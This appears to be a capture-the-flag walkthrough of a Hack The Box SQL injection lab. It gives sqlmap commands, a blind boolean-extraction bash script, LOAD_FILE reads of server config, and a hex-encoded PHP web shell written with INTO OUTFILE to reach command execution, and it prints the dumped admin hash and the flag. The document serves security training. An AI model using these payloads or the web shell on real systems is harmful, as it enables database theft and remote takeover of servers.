---
title: "HTB SQL Injection Fundamentals - Step-by-Step"
date: 2026-03-04
categories: [infosec, web-security]
tags: [sqli, sqlmap, htb, blind-sqli, mysql, rce]
toc: true
toc_label: "Contents"
toc_icon: "database"
excerpt: "Step-by-step walkthrough of HTB SQL Injection Fundamentals: detect SQLi, dump admin hash, extract web root, and read the final flag."
---

> Use this workflow only in legal lab environments (HTB, CTF, approved pentest scope).

## Target and objectives

Target used:

- `https://154.57.164.68:30877`

Objectives:

1. Retrieve `admin` password hash
2. Retrieve web app root path
3. Achieve command execution and read `/flag_XXXXXX.txt`

## 1) Recon the app

Initial endpoint discovery:

```bash
curl -k -s https://154.57.164.68:30877/login.php
curl -k -s https://154.57.164.68:30877/register.php
```

Relevant endpoint:

- `POST /api/register.php`
- injectable parameter: `invitationCode`

### Response oracle used

The app behavior gives a boolean signal:

- **TRUE path:** redirect to `login.php?s=account+created+successfully!`
- **FALSE path:** redirect to `register.php?e=invalid+invitation+code`
- malformed payloads sometimes return `500`

This was enough for blind inference.

## 2) Confirm SQL injection

Test payload:

```bash
curl -k -s -i -X POST 'https://154.57.164.68:30877/api/register.php' \
  --data-urlencode "username=u$RANDOM$RANDOM" \
  --data-urlencode 'password=Abcd!234' \
  --data-urlencode 'repeatPassword=Abcd!234' \
  --data-urlencode "invitationCode=' OR '1'='1"
```

Vulnerable behavior: request follows success path even with invalid invitation input.

## 3) Exploit with sqlmap

Detection run:

```bash
python3 sqlmap.py \
  -u 'https://154.57.164.68:30877/api/register.php' \
  --method POST \
  --data='username=testuser&password=Abcd!234&repeatPassword=Abcd!234&invitationCode=aaaa-bbbb-1111' \
  -p invitationCode \
  --randomize=username \
  --batch \
  --answers='follow=Y,redirect=Y,cookie=Y' \
  --drop-set-cookie
```

Enumerate databases:

```bash
python3 sqlmap.py -u 'https://154.57.164.68:30877/api/register.php' \
  --method POST \
  --data='username=testuser&password=Abcd!234&repeatPassword=Abcd!234&invitationCode=aaaa-bbbb-1111' \
  -p invitationCode \
  --randomize=username \
  --batch \
  --answers='follow=Y,redirect=Y,cookie=Y' \
  --drop-set-cookie \
  --dbs
```

Database identified: `chattr`

## 4) Dump the admin hash

```bash
python3 sqlmap.py -u 'https://154.57.164.68:30877/api/register.php' \
  --method POST \
  --data='username=testuser&password=Abcd!234&repeatPassword=Abcd!234&invitationCode=aaaa-bbbb-1111' \
  -p invitationCode \
  --randomize=username \
  --batch \
  --answers='follow=Y,redirect=Y,cookie=Y' \
  --drop-set-cookie \
  -D chattr -T Users -C Username,Password \
  --where="Username='admin'" \
  --dump
```

Recovered hash:

```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

## 5) Extract web root path

Read nginx config via SQL functions and extract the `root` value.

Useful queries:

```sql
SELECT @@secure_file_priv;
SELECT @@datadir;
SELECT @@basedir;
SELECT @@plugin_dir;
SELECT USER();
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
```

Recovered web root:

```text
/var/www/chattr-prod
```

## 6) Write PHP shell via SQLi

Pre-checks that mattered:

- SQL user: `chattr_dbUser@localhost`
- privilege includes `FILE`
- endpoint accepted 1-column `UNION`

Write shell with `INTO OUTFILE`:

```bash
hex="0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"
curl -k -s -X POST 'https://154.57.164.68:30877/api/register.php' \
  --data-urlencode "username=r$RANDOM$RANDOM" \
  --data-urlencode 'password=Abcd!234' \
  --data-urlencode 'repeatPassword=Abcd!234' \
  --data-urlencode "invitationCode=aaaa-bbbb-1111') UNION SELECT ${hex} INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -"
```

Verify command execution:

```bash
curl -k -s 'https://154.57.164.68:30877/shell.php?cmd=id'
```

Expected output includes: `uid=33(www-data)`.

## 7) Retrieve the flag

Find flag file:

```bash
curl -k -s "https://154.57.164.68:30877/shell.php?cmd=ls%20/%20|%20grep%20'^flag_'"
```

Read flag:

```bash
curl -k -s 'https://154.57.164.68:30877/shell.php?cmd=cat%20/flag_876a4c.txt'
```

Recovered flag:

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

## 8) Manual approach (no sqlmap extraction)

Use this fully manual sequence, driven by boolean SQLi + redirect oracle.

```bash
BASE='https://154.57.164.68:30877/api/register.php'

oracle() {
  local cond="$1"
  local u="u$(date +%s%N | cut -c1-13)$RANDOM"
  local payload="aaaa-bbbb-1111') OR (${cond})-- -"
  local redir
  redir=$(curl -k -s -o /dev/null -w '%{redirect_url}' -X POST "$BASE" \
    --data-urlencode "username=$u" \
    --data-urlencode 'password=Abcd!234' \
    --data-urlencode 'repeatPassword=Abcd!234' \
    --data-urlencode "invitationCode=$payload")
  [[ "$redir" == *"login.php?s=account+created+successfully!"* ]]
}

infer_len() {
  local expr="$1" max="${2:-200}" n
  for n in $(seq 1 "$max"); do
    if oracle "LENGTH(${expr})=${n}"; then echo "$n"; return 0; fi
  done
  return 1
}

infer_char() {
  local expr="$1" pos="$2" lo=32 hi=126 mid
  while [ $lo -le $hi ]; do
    mid=$(( (lo+hi)/2 ))
    if oracle "ASCII(SUBSTRING(${expr},${pos},1))>${mid}"; then
      lo=$((mid+1))
    else
      hi=$((mid-1))
    fi
  done
  printf "\\$(printf '%03o' "$lo")"
}

infer_string() {
  local expr="$1" maxlen="${2:-200}" len out="" i c
  len=$(infer_len "$expr" "$maxlen") || return 1
  for i in $(seq 1 "$len"); do
    c=$(infer_char "$expr" "$i")
    out+="$c"
  done
  echo "$out"
}

# Run these in order:

# 0) Confirm SQLi oracle
oracle "1=1" && echo TRUE
oracle "1=2" && echo FALSE || echo FALSE

# 1) Enumerate databases (discover chattr)
db_count=$(infer_string "(SELECT COUNT(*) FROM information_schema.schemata)" 3)
echo "db_count=$db_count"
for i in $(seq 0 $((db_count-1))); do
  name=$(infer_string "(SELECT schema_name FROM information_schema.schemata LIMIT ${i},1)" 64)
  echo "db[$i]=$name"
done

# 2) Enumerate tables in chattr
t_count=$(infer_string "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='chattr')" 3)
echo "table_count=$t_count"
for i in $(seq 0 $((t_count-1))); do
  t=$(infer_string "(SELECT table_name FROM information_schema.tables WHERE table_schema='chattr' LIMIT ${i},1)" 64)
  echo "table[$i]=$t"
done

# 3) Enumerate columns in Users
c_count=$(infer_string "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='chattr' AND table_name='Users')" 3)
echo "col_count=$c_count"
for i in $(seq 0 $((c_count-1))); do
  c=$(infer_string "(SELECT column_name FROM information_schema.columns WHERE table_schema='chattr' AND table_name='Users' LIMIT ${i},1)" 64)
  echo "col[$i]=$c"
done

# 4) Q1: Extract admin password hash
admin_hash=$(infer_string "(SELECT Password FROM chattr.Users WHERE Username='admin' LIMIT 0,1)" 200)
echo "admin_hash=$admin_hash"

# 5) Q2: Extract web root path from nginx config via LOAD_FILE
root_expr="(SELECT TRIM(SUBSTRING_INDEX(SUBSTRING_INDEX(LOAD_FILE('/etc/nginx/sites-enabled/default'),'root ',-1),';',1)))"
web_root=$(infer_string "$root_expr" 128)
echo "web_root=$web_root"

# 6) Q3: RCE - write webshell with UNION INTO OUTFILE
hex_shell="0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"  # <?php system($_GET['cmd']); ?>
u="r$RANDOM$RANDOM"
payload="aaaa-bbbb-1111') UNION SELECT ${hex_shell} INTO OUTFILE '${web_root}/shell.php'-- -"

curl -k -s -o /dev/null -X POST "$BASE" \
  --data-urlencode "username=$u" \
  --data-urlencode 'password=Abcd!234' \
  --data-urlencode 'repeatPassword=Abcd!234' \
  --data-urlencode "invitationCode=$payload"

# 7) Verify RCE + read flag
curl -k -s 'https://154.57.164.68:30877/shell.php?cmd=id'
flag_file=$(curl -k -s "https://154.57.164.68:30877/shell.php?cmd=ls%20/%20|%20grep%20'^flag_'")
echo "flag_file=$flag_file"
curl -k -s "https://154.57.164.68:30877/shell.php?cmd=cat%20/${flag_file}"
```

## Final outputs

1. Admin hash: `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`
2. Web root: `/var/www/chattr-prod`
3. Flag: `061b1aeb94dec6bf5d9c27032b3c1d8d`
